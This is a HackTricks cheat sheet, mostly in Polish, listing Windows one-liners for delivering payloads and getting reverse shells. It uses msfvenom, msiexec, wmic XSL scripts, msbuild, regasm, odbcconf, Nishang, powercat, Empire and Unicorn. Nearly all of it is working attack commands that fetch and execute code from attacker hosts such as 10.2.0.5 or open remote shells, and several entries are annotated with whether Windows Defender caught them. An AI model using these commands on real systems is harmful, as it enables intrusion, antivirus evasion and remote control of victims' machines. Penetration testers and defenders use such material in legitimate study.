Znajdź najważniejsze podatności, aby móc je szybko naprawić. Intruder śledzi powierzchnię ataku, przeprowadza proaktywne skanowanie zagrożeń, znajduje problemy w całym stosie technologicznym, od interfejsów API po aplikacje internetowe i systemy chmurowe. [**Wypróbuj za darmo**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) już dziś.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## **Cscript/Wscript**
```bash
powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0.5:8000/reverse_shell.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
```
**Cscript - Metasploit**

Cscript is a command-line scripting engine provided by Microsoft. It is commonly used to execute VBScript or JScript scripts on Windows systems. Metasploit, on the other hand, is a popular penetration testing framework that includes various tools and exploits for testing the security of computer systems.

In the context of Metasploit, Cscript can be used as a payload to deliver malicious scripts to a target system. This can be done by creating a malicious script using Metasploit's scripting capabilities and then using Cscript to execute it on the target.

To use Cscript as a payload in Metasploit, you can follow these steps:

1. Generate a malicious script using Metasploit's scripting capabilities. This can be done using the `msfvenom` command, which allows you to generate various types of payloads.

2. Save the generated script to a file with a `.vbs` or `.js` extension.

3. Use the `exploit/multi/script/web_delivery` module in Metasploit to deliver the malicious script to the target system. This module allows you to generate a standalone script that can be executed on the target.

4. Set the `SRVHOST` and `SRVPORT` options in the module to specify the IP address and port on which the script will be hosted.

5. Start the Metasploit listener by running the `exploit` command.

6. Once the listener is active, execute the generated script on the target system using Cscript. This can be done by running the following command on the target:

   ```
   cscript <path_to_script>
   ```

   Replace `<path_to_script>` with the actual path to the generated script.

7. If everything is set up correctly, the script will be executed on the target system, and you will have a reverse shell or other desired functionality.

It is important to note that using Cscript as a payload requires proper authorization and should only be done in a legal and ethical manner, such as during a penetration test with proper permission.
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
```
**Wykryte przez defendera**

## PS-Bat
```bash
\\webdavserver\folder\batchfile.bat
```
Proces wykonujący żądanie sieciowe: **svchost.exe**\
Dane wyjściowe zapisane na dysku: **Lokalna pamięć podręczna klienta WebDAV**
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
impacket-smbserver -smb2support kali `pwd`
```

```bash
\\10.8.0.3\kali\shell.bat
```
**Wykryte przez defendera**

## **MSIExec**

Atakujący
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
python -m SimpleHTTPServer 80
```
Ofiara:
```
victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
```
**Wykryto**

## **Wmic**

* [Stąd](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
wmic os get /format:"https://webserver/payload.xsl"
```
Przykładowy plik xsl [znajduje się tutaj](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):
```xml
<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
<output method="text"/>
<ms:script implements-prefix="user" language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://10.2.0.5/shell.ps1') | powershell -noprofile -");
]]>
</ms:script>
</stylesheet>
```
**Nie wykryto**

**Możesz łatwo pobrać i uruchomić zombi Koadic, używając stagera wmic**

## Msbuild

* [Stąd](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```
Możesz użyć tej techniki, aby ominąć białą listę aplikacji i ograniczenia Powershell.exe. Zostaniesz poproszony o powłokę PS.\
Po prostu pobierz to i wykonaj: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
```
**Nie wykryto**

## **CSC**

Skompiluj kod C# na maszynie ofiary.
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
```
Możesz pobrać podstawową odwróconą powłokę C# stąd: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)

**Nie wykryto**

## **Regasm/Regsvc**

* [Stąd](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
```
**Nie próbowałem tego**

[**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182)

## Odbcconf

* [Stąd](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
```
**Nie próbowałem tego**

[**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)

## Powłoki Powershell

### PS-Nishang

[https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

W folderze **Shells** znajduje się wiele różnych powłok. Aby pobrać i uruchomić Invoke-_PowerShellTcp.ps1_, skopiuj skrypt i dołącz go na końcu pliku:
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
```
Rozpocznij udostępnianie skryptu na serwerze sieciowym i wykonaj go po stronie ofiary:
```
powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
```
Obrońca nie wykrywa go jako złośliwy kod (jeszcze, 3/04/2019).

**TODO: Sprawdź inne powłoki nishang**

### **PS-Powercat**

[**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)

Pobierz, uruchom serwer WWW, uruchom nasłuchiwanie i wykonaj to na końcu ofiary:
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
Obecnie Defender nie wykrywa tego jako złośliwy kod (jeszcze, 3/04/2019).

**Inne opcje oferowane przez powercat:**

Bind shell, Reverse shell (TCP, UDP, DNS), Przekierowanie portu, Wysyłanie/pobieranie plików, Generowanie payloadów, Serwowanie plików...
```
Serve a cmd Shell:
powercat -l -p 443 -e cmd
Send a cmd Shell:
powercat -c 10.1.1.1 -p 443 -e cmd
Send a powershell:
powercat -c 10.1.1.1 -p 443 -ep
Send a powershell UDP:
powercat -c 10.1.1.1 -p 443 -ep -u
TCP Listener to TCP Client Relay:
powercat -l -p 8000 -r tcp:10.1.1.16:443
Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:
powercat -c 10.1.1.15 -p 443 -e cmd -g
Start A Persistent Server That Serves a File:
powercat -l -p 443 -i C:\inputfile -rep
```
### Empire

[https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)

Utwórz uruchamialny plik powershell, zapisz go w pliku, pobierz i wykonaj go.
```
powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
**Wykryto jako złośliwy kod**

### MSF-Unicorn

[https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)

Utwórz wersję powershell backdooru metasploit za pomocą unicorn
```
python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
```
Uruchom msfconsole z utworzonym zasobem:
```
msfconsole -r unicorn.rc
```
Uruchom serwer sieciowy, który będzie udostępniał plik _powershell\_attack.txt_, a następnie wykonaj na ofierze:
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
```
**Wykryto złośliwy kod**

## Więcej

[PS>Attack](https://github.com/jaredhaight/PSAttack) Konsola PS z załadowanymi niektórymi ofensywnymi modułami PS (zaszyfrowane)\
[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
WinPWN](https://github.com/SecureThisShit/WinPwn) Konsola PS z niektórymi ofensywnymi modułami PS i wykrywaniem proxy (IEX)

## Odwołania

* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [https://gist.github.com/Arno0x](https://gist.github.com/Arno0x)
* [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
* [https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
* [https://www.hackingarticles.in/koadic-com-command-control-framework/](https://www.hackingarticles.in/koadic-com-command-control-framework/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
* [https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
​

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Znajdź najważniejsze podatności, aby szybko je naprawić. Intruder śledzi powierzchnię ataku, wykonuje proaktywne skanowanie zagrożeń, znajduje problemy w całym stosie technologicznym, od interfejsów API po aplikacje internetowe i systemy chmurowe. [**Wypróbuj go za darmo**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) już dziś.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć **reklamę swojej firmy w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
